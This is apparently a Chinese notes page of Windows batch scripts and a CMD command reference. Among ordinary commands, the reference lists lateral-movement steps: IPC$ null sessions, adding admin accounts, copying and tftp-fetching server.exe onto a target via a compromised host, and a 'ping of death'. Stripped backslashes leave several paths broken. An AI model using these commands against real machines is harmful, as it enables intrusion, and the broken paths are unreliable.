		&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; taskkill /f /im explorer.exe &gt;nul<br />
		&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; start &quot;&quot; &quot;explorer.exe&quot;<br />
		<br />
		&nbsp;&nbsp;&nbsp; 4.隐藏某目录的所有文件及文件夹<br />
		&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; cd /d 要隐藏的目录(如：D:)<br />
		&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; for /f &quot;usebackq delims=&quot; %%A in (`dir /a /b`) do (attrib &quot;%%A&quot; -r +h -s)<br />
		<br />
		&nbsp;&nbsp;&nbsp; 5.在批处理中使用密码。密码为admin，输入正确，跳转到next1 ，若输入密码错误3次，则锁屏。。<br />
		&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; @echo off<br />
		&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; set num=0<br />
		&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; :11<br />
		&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; set /p pass=请输入密码:<br />
		&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; if &quot;%pass%&quot;==&quot;admin&quot; goto next1<br />
		&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; set /a num=%num% + 1<br />
		&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; if %num%==3 goto no1<br />
		&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; goto 11<br />
		&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; :no1<br />
		&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; %windir%system32 undll32.exe user32.dll,LockWorkStation<br />
		&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; goto 11<br />
		&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; :next1<br />
		&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; echo 密码正确，执行下面的程式<br />
		&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; pause<br />
		<br />
		&nbsp;&nbsp;&nbsp; 6.清空回收站(未成功)<br />
		&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; @echo off<br />
		&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; del /f /s /q c: ecycler*.*<br />
		&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; ::刷新屏幕<br />
		&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; taskkill /f /im explorer.exe &gt;nul<br />
		&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; start &quot;&quot; &quot;explorer.exe&quot;<br />
		<br />
		&nbsp;&nbsp;&nbsp; 7.让系统断断续续地鸣叫<br />
		&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; @echo off<br />
		&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; :begin<br />
		&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; :: 发出鸣叫(&ldquo;&rdquo;实际就是ASCII码值为7的特殊字符（蜂鸣键beep）<br />
		&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; echo<br />
		&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; :: 让程序暂停一小阵子<br />
		&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; ping -n 1 -l 1 127.1&gt;nul<br />
		&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; goto :begin<br />
		<br />
		&nbsp;&nbsp;&nbsp; 8.将 FAT 卷转换成 NTFS<br />
		&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 利用&ldquo;CONVERT.exe&rdquo;进行,解析如下：<br />
		&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; CONVERT volume /FS:NTFS [/V] [/CvtArea:filename] [/NoSecurity] [/X]<br />
		&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; volume&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 指定驱动器号(后面跟一个冒号)、装载点或卷名。<br />
		&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; /FS:NTFS&nbsp;&nbsp;&nbsp; 指定要被转换成 NTFS 的卷。<br />
		&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; /V&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 指定 Convert 应该用详述模式运行。<br />
		&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; /CvtArea:filename<br />
		&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 将根目录中的一个接续文件指定为NTFS 系统文件的占位符。<br />
		&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; /NoSecurity 指定每个人都可以访问转换的文件和目录的安全设置。<br />
		&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; /X&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 如果必要，先强行卸载卷。该卷的所有打开的句柄则无效。<br />
		<br />
		&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 程序如下：<br />
		&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; @ ECHO OFF<br />
		&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; @ ECHO.<br />
		&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; @ ECHO.&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 说&nbsp;&nbsp; 明<br />
		&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; @ ECHO --------------------------------------------------------------------------<br />
		&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; @ ECHO NTFS是一种磁盘格式。该格式能存放大于4G的单个文件(如高清电影文件)，并可对<br />
		&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; @ ECHO 文件夹进行加密，但有个缺点是DOS下无法访问。建议D盘及其后的盘使用NTFS格式，<br />
		&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; @ ECHO C盘如非必要可以不转换，FAT32与NTFS这两种格式的读写速度几乎是没有差别的。<br />
		&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; @ ECHO --------------------------------------------------------------------------<br />
		&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; @ ECHO.<br />
		&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; convert c: /fs:ntfs<br />
		&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; :: D盘也转成 NTFS<br />
		&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; convert d: /fs:ntfs<br />
		<br />
		&nbsp;&nbsp;&nbsp; 9. 获取我的文档<br />
		&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; SET SF=&quot;HKCUSoftwareMicrosoftWindowsCurrentVersionExplorerShell Folders&quot;<br />
		&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; FOR /F &quot;tokens=2,*&quot; %%I IN (&#39;REG QUERY %SF% /v Personal 2^&gt;NUL^|FIND /I &quot;Personal&quot;&#39;) DO SET &quot;myDoc=%%~J&quot;<br />
		&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; :: 复制文件到我的文档<br />
		&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; XCOPY /D /E /R /Y /C&nbsp; &quot;%cd% est.txt&quot; &quot;%myDoc% est&quot;<br />
		<br />
		<br />
		<br />
		<br />
		<br />
		<br />
		<br />
		<br />
		==========================================<br />
		实例：<br />
		&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 3.IF-ERRORLEVEL<br />
		&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; @ECHO OFF<br />
		&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; XCOPY C:AUTOEXEC.BAT D:IF ERRORLEVEL 1 ECHO 文件拷贝失败<br />
		&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; IF ERRORLEVEL 0 ECHO 成功拷贝文件<br />
		<br />
		&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 如果文件拷贝成功，屏幕就会显示&ldquo;成功拷贝文件&rdquo;，否则就会显示&ldquo;文件拷贝失败&rdquo;。<br />
		&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; IF ERRORLEVEL 是用来测试它的上一个DOS命令的返回值的，注意只是上一个命令的返回值，而且返回值必须依照从大到小次序顺序判断。因此下面的批处理文件是错误的：<br />
		&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; @ECHO OFF<br />
		&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; XCOPY C:AUTOEXEC.BAT D:<br />
		&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; CHO 成功拷贝文件<br />
		&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; IF ERRORLEVEL 1 ECHO 未找到拷贝文件<br />
		&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; IF ERRORLEVEL 2 ECHO 用户通过ctrl-c中止拷贝操作<br />
		&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; IF ERRORLEVEL 3 ECHO 预置错误阻止文件拷贝操作<br />
		&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; IF ERRORLEVEL 4 ECHO 拷贝过程中写盘错误<br />
		&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 无论拷贝是否成功，后面的：<br />
		&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 未找到拷贝文件<br />
		&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 用户通过ctrl-c中止拷贝操作<br />
		&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 预置错误阻止文件拷贝操作<br />
		&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 拷贝过程中写盘错误<br />
		&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 都将显示出来。<br />
		<br />
		&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 以下就是几个常用命令的返回值及其代表的意义：<br />
		&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; backup<br />
		&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 0 备份成功<br />
		&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 1 未找到备份文件<br />
		&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 2 文件共享冲突阻止备份完成<br />
		&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 3 用户用ctrl-c中止备份<br />
		&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 4 由于致命的错误使备份操作中止<br />
		&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; diskcomp<br />
		&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 0 盘比较相同<br />
		&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 1 盘比较不同<br />
		&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 2 用户通过ctrl-c中止比较操作<br />
		&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 3 由于致命的错误使比较操作中止<br />
		&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 4 预置错误中止比较<br />
		&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; diskcopy<br />
		&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 0 盘拷贝操作成功<br />
		&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 1 非致命盘读/写错<br />
		&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 2 用户通过ctrl-c结束拷贝操作<br />
		&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 3 因致命的处理错误使盘拷贝中止<br />
		&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 4 预置错误阻止拷贝操作<br />
		&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; format<br />
		&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 0 格式化成功<br />
		&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 3 用户通过ctrl-c中止格式化处理<br />
		&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 4 因致命的处理错误使格式化中止<br />
		&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 5 在提示&ldquo;proceed with format(y/n)?&rdquo;下用户键入n结束<br />
		&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; xcopy<br />
		&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 0 成功拷贝文件<br />
		&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 1 未找到拷贝文件<br />
		&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 2 用户通过ctrl-c中止拷贝操作<br />
		&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 4 预置错误阻止文件拷贝操作<br />
		&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 5 拷贝过程中写盘错误<br />
		<br />
		<br />
		=============================================================<br />
		@echo off&nbsp;&nbsp;&nbsp; //不显示shell的命令。<br />
		Setlocal&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; //环境改变只适用于这个文件。<br />
		%OS%&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; //为当前的操作系统。<br />
		Rem&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; //注释一行文本。<br />
		Goto 标签&nbsp;&nbsp; //改变执行顺序，去标签位置.<br />
		：标签&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; //定义一个标签。<br />
		Set 变量名=值&nbsp;&nbsp; //定义变量<br />
		Not&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; //取反<br />
		Netstat &ndash;na&nbsp;&nbsp; //显示当前被点用的端口.<br />
		%0&nbsp; %1&nbsp; %2&nbsp; //用于表示批处理文件的参数0为命令,共1-9个参数。<br />
		Shift&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; //用于向前一个参数，原1变0，原2变1.每调用一次shift向前一移动一位。<br />
		Call&nbsp;&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;//调用其他批处理文件或命令。<br />
		Start 命令 参数&nbsp;&nbsp; //指示出在另一个窗口中开始运行命令。<br />
		<br />
		<br />
		<br />
		<br />
		=============================================================<br />
		:: 这段批处理程序可以自动设置Java环境变量<br />
		<br />
		@echo off<br />
		IF EXIST %1injava.exe (<br />
		rem 如输入正确的 Java2SDK 安装目录，开始设置环境变量<br />
		@setx JAVA_HOME %1<br />
		@setx path %path%;%JAVA_HOME%in<br />
		@setx classpath %classpath%;.<br />
		@setx classpath %classpath%;%JAVA_HOME%lib ools.jar<br />
		@setx classpath %classpath%;%JAVA_HOME%libdt.jar<br />
		@setx classpath %classpath%;%JAVA_HOME%jrelib t.jar<br />
		@echo on<br />
		@echo Java 2 SDK 环境参数设置完毕，正常退出。<br />
		) ELSE (<br />
		IF &quot;%1&quot;==&quot;&quot; (<br />
		rem 如没有提供安装目录，提示之后退出<br />
		@echo on<br />
		@echo 没有提供 Java2SDK 的安装目录,不做任何设置，现在退出环境变量设置。<br />
		) ELSE (<br />
		rem 如果提供非空的安装目录但没有binjava.exe，则指定的目录为错误的目录<br />
		@echo on<br />
		@echo 非法的 Java2SDK 的安装目录,不做任何设置，现在退出环境变量设置。<br />
		)<br />
		)<br />
		<br />
		<br />
		<br />
		<br />
		dos命令参考~~~<br />
		net use ipipc$ &quot; &quot; /user:&quot; &quot;&nbsp; 建立IPC空链接<br />
		net use ipipc$ &quot;密码&quot; /user:&quot;用户名&quot;&nbsp; 建立IPC非空链接<br />
		net use h: ipc$ &quot;密码&quot; /user:&quot;用户名&quot;&nbsp; 直接登陆后映射对方C：到本地为H:<br />
		net use h: ipc$&nbsp; 登陆后映射对方C：到本地为H:<br />
		net use ipipc$ /del&nbsp; 删除IPC链接<br />
		net use h: /del&nbsp; 删除映射对方到本地的为H:的映射<br />
		net user 用户名　密码　/add&nbsp; 建立用户<br />
		net user guest /active:yes&nbsp; 激活guest用户<br />
		net user&nbsp; 查看有哪些用户<br />
		net user 帐户名&nbsp; 查看帐户的属性<br />
		net localgroup administrators 用户名 /add&nbsp; 把&ldquo;用户&rdquo;添加到管理员中使其具有管理员权限,注意：administrator后加s用复数<br />
		net start&nbsp; 查看开启了哪些服务<br />
		net start 服务名　&nbsp; 开启服务；(如:net start telnet， net start schedule)<br />
		net stop 服务名&nbsp; 停止某服务<br />
		net time 目标ip&nbsp; 查看对方时间<br />
		net time 目标ip /set&nbsp; 设置本地计算机时间与&ldquo;目标IP&rdquo;主机的时间同步,加上参数/yes可取消确认信息<br />
		net view&nbsp; 查看本地局域网内开启了哪些共享<br />
		net view ip&nbsp; 查看对方局域网内开启了哪些共享<br />
		net config&nbsp; 显示系统网络设置<br />
		net logoff&nbsp; 断开连接的共享<br />
		net pause 服务名&nbsp; 暂停某服务<br />
		net send ip &quot;文本信息&quot;&nbsp; 向对方发信息<br />
		net ver&nbsp; 局域网内正在使用的网络连接类型和信息<br />
		net share&nbsp; 查看本地开启的共享<br />
		net share ipc$&nbsp; 开启ipc$共享<br />
		net share ipc$ /del&nbsp; 删除ipc$共享<br />
		net share c$ /del&nbsp; 删除C：共享<br />
		net user guest 12345&nbsp; 用guest用户登陆后用将密码改为12345<br />
		net password 密码&nbsp; 更改系统登陆密码<br />
		netstat -a&nbsp; 查看开启了哪些端口,常用netstat -an<br />
		netstat -n&nbsp; 查看端口的网络连接情况，常用netstat -an<br />
		netstat -v&nbsp; 查看正在进行的工作<br />
		netstat -p 协议名 例：netstat -p tcq/ip&nbsp; 查看某协议使用情况（查看tcp/ip协议使用情况）<br />
		netstat -s&nbsp; 查看正在使用的所有协议使用情况<br />
		nbtstat -A ip&nbsp; 对方136到139其中一个端口开了的话，就可查看对方最近登陆的用户名（03前的为用户名）-注意：参数-A要大写<br />
		tracert -参数 ip(或计算机名)&nbsp; 跟踪路由（数据包），参数：&ldquo;-w数字&rdquo;用于设置超时间隔。<br />
		ping ip(或域名)&nbsp; 向对方主机发送默认大小为32字节的数据，参数：&ldquo;-l[空格]数据包大小&rdquo;；&ldquo;-n发送数据次数&rdquo;；&ldquo;-t&rdquo;指一直ping。<br />
		ping -t -l 65550 ip&nbsp; 死亡之ping(发送大于K的文件并一直ping就成了死亡之ping)<br />
		ipconfig (winipcfg)&nbsp; 用于windows NT及XP(windows 95 98)查看本地ip地址，ipconfig可用参数&ldquo;/all&rdquo;显示全部配置信息<br />
		tlist -t&nbsp; 以树行列表显示进程(为系统的附加工具，默认是没有安装的，在安装目录的Support/tools文件夹内)<br />
		kill -F 进程名&nbsp; 加-F参数后强制结束某进程(为系统的附加工具，默认是没有安装的，在安装目录的Support/tools文件夹内)<br />
		del -F 文件名&nbsp; 加-F参数后就可删除只读文件,/AR、/AH、/AS、/AA分别表示删除只读、隐藏、系统、存档文件，/A-R、/A-H、/A-S、/A-A表示删除除只读、隐藏、系统、存档以外的文件。例如&ldquo;DEL/AR *.*&rdquo;表示删除当前目录下所有只读文件，&ldquo;DEL/A-S *.*&rdquo;表示删除当前目录下除系统文件以外的所有文件<br />
		del /S /Q 目录 或用：rmdir /s /Q 目录 &nbsp;/S删除目录及目录下的所有子目录和文件。同时使用参数/Q 可取消删除操作时的系统确认就直接删除。（二个命令作用相同）<br />
		move 盘符路径要移动的文件名　存放移动文件的路径移动后文件名&nbsp; 移动文件,用参数/y将取消确认移动目录存在相同文件的提示就直接覆盖<br />
		fc one.txt two.txt &gt; 3st.txt&nbsp; 对比二个文件并把不同之处输出到3st.txt文件中，&quot;&gt; &quot;和&quot;&gt; &gt;&quot; 是重定向命令<br />
		at id号&nbsp; 开启已注册的某个计划任务<br />
		at /delete&nbsp; 停止所有计划任务，用参数/yes则不需要确认就直接停止<br />
		at id号 /delete&nbsp; 停止某个已注册的计划任务<br />
		at&nbsp; 查看所有的计划任务<br />
		at ip time 程序名(或一个命令) /r&nbsp; 在某时间运行对方某程序并重新启动计算机<br />
		finger username @host&nbsp; 查看最近有哪些用户登陆<br />
		telnet ip 端口&nbsp; 远和登陆服务器,默认端口为23<br />
		open ip&nbsp; 连接到IP（属telnet登陆后的命令）<br />
		telnet&nbsp; 在本机上直接键入telnet 将进入本机的telnet<br />
		copy 路径文件名1　路径文件名2 /y &nbsp;复制文件1到指定的目录为文件2，用参数/y就同时取消确认你要改写一份现存目录文件<br />
		copy c:srv.exe ipadmin$&nbsp; 复制本地c:srv.exe到对方的admin下<br />
		cppy 1st.jpg/b+2st.txt/a 3st.jpg&nbsp; 将2st.txt的内容藏身到1st.jpg中生成3st.jpg新的文件，注：2st.txt文件头要空三排，参数：/b指二进制文件，/a指ASCLL格式文件<br />
		copy ipadmin$svv.exe c: 或:copyipadmin$*.*&nbsp; 复制对方admini$共享下的srv.exe文件（所有文件）至本地C：<br />
		xcopy 要复制的文件或目录树　目标地址目录名&nbsp; 复制文件和目录树，用参数/Y将不提示覆盖相同文件<br />
		tftp -i 自己IP(用肉机作跳板时这用肉机IP) get server.exe c:server.exe 登陆后，将&ldquo;IP&rdquo;的server.exe下载到目标主机c:server.exe 参数：-i指以二进制模式传送，如传送exe文件时用，如不加-i 则以ASCII模式（传送文本文件模式）进行传送<br />
		tftp -i 对方IP　put c:server.exe&nbsp; 登陆后，上传本地c:server.exe至主机<br />
		ftp ip 端口&nbsp; 用于上传文件至服务器或进行文件操作，默认端口为21。bin指用二进制方式传送（可执行文件进）；默认为ASCII格式传送(文本文件时)<br />
		route print&nbsp; 显示出IP路由，将主要显示网络地址Network addres，子网掩码Netmask，网关地址Gateway addres，接口地址Interface<br />
		arp&nbsp; 查看和处理ARP缓存，ARP是名字解析的意思，负责把一个IP解析成一个物理性的MAC地址。arp -a将显示出全部信息<br />
		start 程序名或命令 /max 或/min&nbsp; 新开一个新窗口并最大化（最小化）运行某程序或命令<br />
		mem&nbsp; 查看cpu使用情况<br />
		attrib 文件名(目录名)&nbsp; 查看某文件（目录）的属性<br />
		attrib 文件名 -A -R -S -H 或 +A +R +S +H&nbsp; 去掉(添加)某文件的 存档，只读，系统，隐藏 属性；用＋则是添加为某属性<br />
		dir&nbsp; 查看文件，参数：/Q显示文件及目录属系统哪个用户，/T:C显示文件创建时间，/T:A显示文件上次被访问时间，/T:W上次被修改时间<br />
		date /t 、 time /t 使用此参数即&ldquo;DATE/T&rdquo;、&ldquo;TIME/T&rdquo;将只显示当前日期和时间，而不必输入新日期和时间<br />
		set 指定环境变量名称=要指派给变量的字符&nbsp; 设置环境变量<br />
		set&nbsp; 显示当前所有的环境变量<br />
		set p(或其它字符)&nbsp; 显示出当前以字符p(或其它字符)开头的所有环境变量<br />
		pause&nbsp; 暂停批处理程序，并显示出：请按任意键继续....<br />
		if&nbsp; 在批处理程序中执行条件处理（更多说明见if命令及变量）<br />
		goto 标签&nbsp; 将cmd.exe导向到批处理程序中带标签的行（标签必须单独一行，且以冒号打头，例如：&ldquo;：start&rdquo;标签）<br />
		call 路径批处理文件名&nbsp; 从批处理程序中调用另一个批处理程序 （更多说明见call /?）<br />
		for&nbsp; 对一组文件中的每一个文件执行某个特定命令（更多说明见for命令及变量）<br />
		echo on或off&nbsp; 打开或关闭echo，仅用echo不加参数则显示当前echo设置<br />
		echo 信息&nbsp; 在屏幕上显示出信息<br />
		echo 信息 &gt;&gt; pass.txt&nbsp; 将&quot;信息&quot;保存到pass.txt文件中<br />
		findstr &quot;Hello&quot; aa.txt&nbsp; 在aa.txt文件中寻找字符串hello<br />
		find 文件名&nbsp; 查找某文件<br />
		title 标题名字&nbsp; 更改CMD窗口标题名字<br />
		color 颜色值&nbsp; 设置cmd控制台前景和背景颜色；0＝黑、1＝蓝、2＝绿、3＝浅绿、4＝红、5＝紫、6＝黄、7=白、8=灰、9=淡蓝、A＝淡绿、B=淡浅绿、C=淡红、D=淡紫、E=淡黄、F=亮白<br />
		prompt 名称&nbsp; 更改cmd.exe的显示的命令提示符(把C:、D:统一改为：EntSky )<br />
		print 文件名&nbsp; 打印文本文件<br />
		2ver&nbsp; 在DOS窗口下显示版本信息<br />
		winver&nbsp; 弹出一个窗口显示版本信息（内存大小、系统版本、补丁版本、计算机名）<br />
		format 盘符 /FS:类型&nbsp; 格式化磁盘,类型:FAT、FAT32、NTFS ,例：Format D: /FS:NTFS<br />
		md　目录名&nbsp; 创建目录<br />
		replace 源文件　要替换文件的目录&nbsp; 替换文件<br />
		ren 原文件名　新文件名&nbsp; 重命名文件名<br />
		tree&nbsp; 以树形结构显示出目录，用参数-f 将列出第个文件夹中文件名称<br />
		type 文件名&nbsp; 显示文本文件的内容<br />
		more 文件名 逐屏显示输出文件<br />
		doskey 要锁定的命令＝字符<br />
		doskey 要解锁命令= 为DOS提供的锁定命令(编辑命令行，重新调用win2k命令，并创建宏)。如：锁定dir命令：doskey dir=entsky (不能用doskey dir=dir)；解锁：doskey dir=<br />
		taskmgr 调出任务管理器<br />
		chkdsk /F D: 检查磁盘D并显示状态报告；加参数/f并修复磁盘上的错误<br />
		tlntadmn telnt服务admn,键入tlntadmn选择3，再选择8,就可以更改telnet服务默认端口23为其它任何端口<br />
		exit&nbsp; 退出cmd.exe程序或目前，用参数/B则是退出当前批处理脚本而不是cmd.exe<br />
		path 路径可执行文件的文件名 为可执行文件设置一个路径。<br />
		cmd 启动一个win2K命令解释窗口。参数：/eff、/en 关闭、开启命令扩展；更我详细说明见cmd /?<br />
		regedit /s 注册表文件名&nbsp; 导入注册表；参数/S指安静模式导入，无任何提示；<br />
		regedit /e 注册表文件名 导出注册表<br />
		cacls 文件名　参数 显示或修改文件访问控制列表（ACL）&mdash;&mdash;针对NTFS格式时。参数：/D 用户名:设定拒绝某用户访问；/P 用户名:perm 替换指定用户的访问权限；/G 用户名:perm 赋予指定用户访问权限；Perm 可以是: N 无，R 读取， W 写入， C 更改(写入)，F 完全控制；例：cacls D: est.txt /D pub 设定d: est.txt拒绝pub用户访问。<br />
		cacls 文件名&nbsp; 查看文件的访问用户权限列表<br />
		REM 文本内容&nbsp; 在批处理文件中添加注解<br />
		netsh&nbsp; 查看或更改本地网络配置情况<br />
		<br />
		IIS服务命令：<br />
		iisreset /reboot&nbsp; 重启win2k计算机（但有提示系统将重启信息出现）<br />
		iisreset /start或stop&nbsp; 启动（停止）所有Internet服务<br />
		iisreset /restart&nbsp; 停止然后重新启动所有Internet服务<br />
		iisreset /status&nbsp; 显示所有Internet服务状态<br />
		iisreset /enable或disable&nbsp; 在本地系统上启用（禁用）Internet服务的重新启动<br />
		iisreset /rebootonerror&nbsp; 当启动、停止或重新启动Internet服务时，若发生错误将重新开机<br />
		iisreset /noforce&nbsp; 若无法停止Internet服务，将不会强制终止Internet服务<br />
		iisreset /timeout&nbsp; Val在到达逾时间（秒）时，仍未停止Internet服务，若指定/rebootonerror参数，则电脑将会重新开机。预设值为重新启动20秒，停止60秒，重新开机0秒。<br />
		FTP 命令： (后面有详细说明内容)<br />
		ftp的命令行格式为:<br />
		ftp －v －d －i －n －g[主机名] －v 显示远程服务器的所有响应信息。<br />
		－d 使用调试方式。<br />
		－n 限制ftp的自动登录,即不使用.netrc文件。<br />
		－g 取消全局文件名。<br />
		help [命令] 或 /?[命令] 查看命令说明<br />
		bye 或 quit 终止主机FTP进程,并退出FTP管理方式.<br />
		pwd 列出当前远端主机目录<br />
		put 或 send 本地文件名 [上传到主机上的文件名] 将本地一个文件传送至远端主机中<br />
		get 或 recv [远程主机文件名] [下载到本地后的文件名] 从远端主机中传送至本地主机中<br />
		mget [remote-files]&nbsp; 从远端主机接收一批文件至本地主机<br />
		mput local-files 将本地主机中一批文件传送至远端主机<br />
		dir 或 ls [remote-directory] [local-file]&nbsp; 列出当前远端主机目录中的文件.如果有本地文件,就将结果写至本地文件<br />
		ascii 设定以ASCII方式传送文件(缺省值)<br />
		bin 或 image 设定以二进制方式传送文件<br />
		bell 每完成一次文件传送,报警提示<br />
		cdup 返回上一级目录<br />
		close 中断与远程服务器的ftp会话(与open对应)<br />
		open host[port] 建立指定ftp服务器连接,可指定连接端口<br />
		delete 删除远端主机中的文件<br />
		mdelete [remote-files] 删除一批文件<br />
		mkdir directory-name 在远端主机中建立目录<br />
		rename [from] [to] 改变远端主机中的文件名<br />
		rmdir directory-name 删除远端主机中的目录<br />
		status 显示当前FTP的状态<br />
		system 显示远端主机系统类型<br />
		user user-name [password] [account] 重新以别的用户名登录远端主机<br />
		open host [port] 重新建立一个新的连接<br />
